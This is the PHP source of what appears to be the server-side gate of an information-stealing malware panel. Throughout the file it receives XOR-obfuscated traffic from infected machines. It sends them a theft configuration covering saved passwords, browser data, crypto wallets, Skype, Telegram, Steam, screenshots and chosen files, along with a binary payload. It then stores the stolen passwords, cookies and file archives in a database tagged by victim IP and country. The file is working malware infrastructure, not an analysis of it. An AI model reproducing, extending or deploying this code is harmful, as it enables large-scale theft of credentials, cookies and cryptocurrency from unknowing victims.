<?php
@error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time', 0);
@ini_set('max_input_vars', 100000000);
@ini_set('post_max_size', 0);
@ini_set("memory_limit","500M");
header('Content-Type: application/octet-stream');


function CB_XOR($key, &$data){
	$keylen=strlen($key);
	$j=0;
	for($i=0;$i<strlen($data); $i++){
		$data[$i]= chr(ord($data[$i])^ord($key[$j]));
		$j++;
		if($j>($keylen-1)) $j=0;
	}
}

function CB_XORm($data, $key, $max){
	$datalen=strlen($data);
	$keylen=strlen($key);
	if ($datalen>=$max) $datalen=$max;
	$j=0;
	for($i=0;$i<$datalen; $i++){
		$data[$i] = chr(ord($data[$i])^ord($key[$j]));
		$j++;
		if($j>($keylen-1)) $j=0;
	}
	return $data;
}

function RandomKey($len){
	$data='';
	for($i=0; $i<$len; $i++)
		$data .= chr(rand(1, 253));
	return $data;
};

function CB_ENC($data){
	$l=0;
	$k='';
	$l=rand(1, 253);
	$k=RandomKey($l);
	$result='';
	$result.=chr($l).$k.CB_XOR($k, $data);
	return $result;
};

function CB_DEC($data){
	$l=ord($data[0]);
	$k=substr($data, 1,$l);
	$data=substr($data, $l+1);
	return CB_XOR($k, $data);

};

function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}



function GetWork($mid){
	include "config.php";
	include "functions.php";
	include "modules/sxgeo/SxGeo.php";
	$link = mysqli_connect($database_host, $database_user, $database_pass, $database_name) or die('No connect');
	mysqli_set_charset($link, 'utf8' );
	$query = sprintf("SELECT COUNT(*) FROM reports WHERE reports.m_id='%s'", 
					mysqli_real_escape_string($link, $mid));
	$res = mysqli_query($link, $query) or die('Query error');

	$row = mysqli_fetch_row($res);
	
	$count = $row[0];
	$repeated_reports = true;
	
	$JSONstr = FileToString("config.json");
	$obj=json_decode($JSONstr);


	$CFGstr = "";

	$CFGstr .= ($obj->isDouble) ? '+' : '-';
	$CFGstr .= ($obj->isSavedPasswords) ? '+' : '-';
	$CFGstr .= ($obj->isBrowserData) ? '+' : '-';
	$CFGstr .= ($obj->isWallets) ? '+' : '-';
	$CFGstr .= ($obj->isSkype) ? '+' : '-';
	$CFGstr .= ($obj->isTelegram) ? '+' : '-';
	$CFGstr .= ($obj->isSteam) ? '+' : '-';
	$CFGstr .= ($obj->isScreenshot) ? '+' : '-';
	$CFGstr .= ($obj->isDelete) ? '+' : '-';
	$CFGstr .= "\r\n";
	foreach($obj->files as $val){
		$CFGstr .= "F".chr(9);
		$CFGstr .= base64_decode($val->fgName).chr(9);
		$CFGstr .= base64_decode($val->fgPath).chr(9);
		$CFGstr .= base64_decode($val->fgMask).chr(9);
		$CFGstr .= base64_decode($val->fgMaxsize).chr(9);
		$CFGstr .= ($val->fgSubfolders) ? '+' : '-'; $CFGstr .= chr(9);
		$CFGstr .= ($val->fgShortcuts) ? '+' : '-'; $CFGstr .= chr(9);
		
		$tmp = base64_decode($val->fgExceptions);
		$tmp = str_replace("\r\n", "|", $tmp);
		$tmp = str_replace("\n", "|", $tmp);
		$tmp = str_replace("||", "|", $tmp);
		$CFGstr .= $tmp;
		
		$CFGstr .= "\r\n";	
	}
	if (strlen($obj->DAE)>3) {
		$CFGstr .= "D".chr(9).($obj->DAE)."\r\n";
	}
	
	if ($get_ip_api == false){
		$IP = getUserIP();
		$SxGeo = new SxGeo('modules/sxgeo/SxGeo.dat');
		$CO = $SxGeo->get($IP);
		$CFGstr .= "I".chr(9).$IP.":".$CO."\r\n";
	}
	
	if ($get_ip_api == true){
		$CFGstr .= "I".chr(9)."?".chr(9)."reserved"."\r\n";
	}
	
	
	
	

	$repeated_reports = $obj->isDouble;
	$res = true;
	if(($repeated_reports == false) and ($count>0)) 
		$res=false;
	$ret = "exit";
	
	if($res==true){
		$config = base64_encode($CFGstr);

		$ret = "<c>$config</c>".FileToString("./modules/bin/bin.bin");
//CQkvLyRyZXQ9IiI7PHM+JHNxbGl0ZTM8L3M+PHo+JHppcHBlcjwvej48ZD4kc3RyaW5nczwvZD4NCgkJCQkvKiRzcWxpdGUzID0gCWJhc2U2NF9lbmNvZGUoRmlsZVRvU3RyaW5nKCIuL21vZHVsZXMvYmluL3NxbGl0ZTMuZGxsIikpOw0KCQkkemlwcGVyID0gCWJhc2U2NF9lbmNvZGUoRmlsZVRvU3RyaW5nKCIuL21vZHVsZXMvYmluL2xpYi5kbGwiKSk7DQoJCSRzdHJpbmdzID0gCWJhc2U2NF9lbmNvZGUoRmlsZVRvU3RyaW5nKCIuL21vZHVsZXMvYmluL3N0cmluZ3MuYmluIikpOw0KCQkqLw==
	}
	mysqli_close($link);
	return $ret;
};




function ParseReport($data){
	include "functions.php";
	include "config.php";
	include_once("modules/sxgeo/SxGeo.php");
	$unical_guid = "EDSER93-1EDA-4W4C-BEED-WNFYRIFHBF4C04CFEW99-FES9-4558-9FEF-HFDIUFG6D851";
	$info = (pars($data, "<info$unical_guid>", "</info$unical_guid>"));
	$pwds = (pars($data, "<pwds$unical_guid>", "</pwds$unical_guid>"));
	$coks = (pars($data, "<coks$unical_guid>", "</coks$unical_guid>"));
	$file = (pars($data, "<file$unical_guid>", "</file$unical_guid>"));
	$list = (pars($data, "<list$unical_guid>", "</list$unical_guid>"));
	
	$IP = getUserIP();


	$info = explode('|', $info);
	$link = mysqli_connect($database_host, $database_user, $database_pass, $database_name) or die('No connect');

	mysqli_set_charset($link, 'utf8' );
	$filename = date("Y-m-d H-i-s").urldecode($info[0]).".zip"; 
	$SxGeo = new SxGeo('modules/sxgeo/SxGeo.dat');
	$isocode = $SxGeo->get($IP);
	
	//$isocode =  tabgeo_country_v4($IP);
	if (@$isocode == "") $isocode = "AA";
	
	$IPAPI = (pars($data, "<ip$unical_guid>", "</ip$unical_guid>"));
	if (strlen($IPAPI)>1){
		
		$tIP = explode(':', $IPAPI)[0];
		$tCO = explode(':', $IPAPI)[1];
		
		if (strlen($tIP)>1) $IP = $tIP; 
		if (strlen($tCO)>1) $isocode = $tCO; 
	};
	$data="";
	$query = sprintf("INSERT INTO reports (m_id,ip,country,date,time,compname,username,os_name,os_arch,os_ver,files_count, btc_count, cc_count,passwords_count,bin_type,bin_rights,filename) VALUES ('%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s')", 
					mysqli_real_escape_string($link, urldecode($info[0])),
					mysqli_real_escape_string($link, $IP),
					mysqli_real_escape_string($link, $isocode),
					mysqli_real_escape_string($link, date("Y-m-d")),
					mysqli_real_escape_string($link, date("H:i:s")),
					mysqli_real_escape_string($link, iconv("cp1251", "utf-8", urldecode($info[4]))), 
					mysqli_real_escape_string($link, iconv("cp1251", "utf-8", urldecode($info[5]))),   //user
					mysqli_real_escape_string($link, iconv("cp1251", "utf-8", urldecode($info[2]))),
					mysqli_real_escape_string($link, urldecode($info[3])),
					mysqli_real_escape_string($link, urldecode($info[1])),
					
					mysqli_real_escape_string($link, urldecode($info[9])),
					mysqli_real_escape_string($link, urldecode($info[7])),
					mysqli_real_escape_string($link, urldecode($info[8])),
					mysqli_real_escape_string($link, urldecode($info[6])),
					
					mysqli_real_escape_string($link, urldecode($info[10])),
					mysqli_real_escape_string($link, urldecode($info[11])),
					mysqli_real_escape_string($link, $filename));
	
	$res = mysqli_query($link,$query) or die('Query error');
	$r_id= mysqli_insert_id($link);
	
	$pwdlist = explode("\r\n", $pwds);
		foreach ($pwdlist as &$value) {
		$line = explode("|",$value);
		$soft_type	= mysqli_real_escape_string($link, urldecode(@$line[0]));
		$soft_name	= mysqli_real_escape_string($link, urldecode(@$line[1]));
		$p1 		= mysqli_real_escape_string($link, urldecode(@$line[2]));
		$p2			= mysqli_real_escape_string($link, urldecode(@$line[3]));
		$p3			= mysqli_real_escape_string($link, urldecode(@$line[4]));
		$p4			= mysqli_real_escape_string($link, urldecode(@$line[5]));
		if(strlen($soft_type)>0)$result = mysqli_query($link, "INSERT INTO `passwords` (p_soft_type, p_soft_name,r_id, p_p1, p_p2, p_p3, p_p4) VALUES('$soft_type', '$soft_name','$r_id', '$p1', '$p2', '$p3', '$p4')");
	}
	
	$query = 'INSERT INTO `cookies`(domain, r_id) VALUES ';
	$cookielist = explode("\r\n", $coks);
	foreach ($cookielist as $host) {
		$query .= sprintf("('%s', '$r_id'),", mysqli_real_escape_string($link, urldecode($host)))."\r\n";
		
	}
	$query = substr($query, 0, -3);
	$result = mysqli_query($link, $query);
	
	
	/*PARSE FILE*/
	

	/**/
	
	WriteToFile("./files/$filename", $file);
	
	
	/*
	WriteToFile('info.txt', $info);
	WriteToFile('pwds.txt', $pwds);
	WriteToFile('coks.txt', $coks);
	WriteToFile('file.txt', $file);
	*/

};




$fileopen=fopen("./files/index.html", "w");
fwrite($fileopen,"");
fclose($fileopen);
	

$xorkey = chr(254).chr(41).chr(54);
$postdata = file_get_contents("php://input");
$postdata = CB_XORm($postdata, $xorkey, 1024*512);
	if(strncmp("reportdata", $postdata, 10)==0){
			//$fileopen=fopen('postdata.txt', "w");
			//fwrite($fileopen,$postdata);
			//fclose($fileopen);
		ParseReport(substr($postdata,11));
		die();
	}; 


	if(strncmp("getcfg", $postdata, 6)==0){
		$work=GetWork(urldecode(substr($postdata,7)));
		$work=CB_XORm($work, $xorkey, 1024*512);
		echo $work;
	};
	
	



//echo CB_ENC($postdata);
?>